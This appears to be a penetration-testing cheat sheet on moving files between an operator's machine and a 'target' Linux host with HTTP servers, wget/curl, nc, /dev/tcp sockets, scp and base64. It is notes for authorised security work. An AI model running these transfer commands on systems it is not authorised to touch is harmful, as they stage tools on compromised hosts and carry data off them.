---
title: "File Transfer (Linux To Linux)"
date: 2024-6-26
tags: ["file transfer", "nc", "scp"]
---

{{< tab set1 tab1 active >}}HTTP{{< /tab >}}
{{< tab set1 tab2 >}}nc{{< /tab >}}
{{< tab set1 tab3 >}}scp{{< /tab >}}
{{< tab set1 tab4 >}}PIPE{{< /tab >}}
{{< tab set1 tab5 >}}Base64{{< /tab >}}
{{< tabcontent set1 tab1 >}}

```console
# Start a local HTTP server
python3 -m http.server <LOCAL_PORT>
```

```console
# In target Linux machine
wget <LOCAL_IP>:<LOCAL_PORT>/<FILE>
```

```console
# In target Linux machine
curl <LOCAL_IP>:<LOCAL_PORT>/<FILE> -o <REMOTE_DEST_PATH>
```

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

```console
# In our local Linux machine
nc -lvnp <LOCAL_PORT> < <FILE>
```

```console
# In target Linux machine
nc -w3 <LOCAL_IP> <LOCAL_PORT> > <FILE>
```

{{< /tabcontent >}}
{{< tabcontent set1 tab3 >}}

#### Remote to Local

```console
# With password
scp <USER>@<TARGET>:<REMOTE_FILE_PATH> <LOCAL_DEST_PATH>
```

```console
# With id_rsa
scp -i id_rsa <USER>@<TARGET>:<REMOTE_FILE_PATH> <LOCAL_DEST_PATH>
```

#### Local to Remote

```console
# With password
scp <LOCAL_FILE_PATH> <USER>@<TARGET>:<REMOTE_DEST_PATH>
```

```console
# With id_rsa
scp -i id_rsa <LOCAL_FILE_PATH> <USER>@<TARGET>:<REMOTE_DEST_PATH>
```

{{< /tabcontent >}}
{{< tabcontent set1 tab4 >}}

#### Local to Remote

```console
# In our local Linux machine
cat <FILE> | nc -lnvp <LOCAL_PORT>
```

```console
# In target Linux machine
exec 3<>/dev/tcp/<LOCAL_IP>/<LOCAL_PORT>
```

```console
# Ctrl+C to interrupt after some time
cat <&3 > <FILE>
```

```console
# Check
md5sum <FILE>
```

{{< /tabcontent >}}
{{< tabcontent set1 tab5 >}}

#### Small binary

```console
# Base64 encode binary
cat <FILE> | base64 -w0
```

```console
# Copy and paste the base64 encoded binary
echo -n '<BASE64_FILE>' | base64 -d > <FILE>
```

<small>*Note: For restricted environment*</small>

{{< /tabcontent >}}
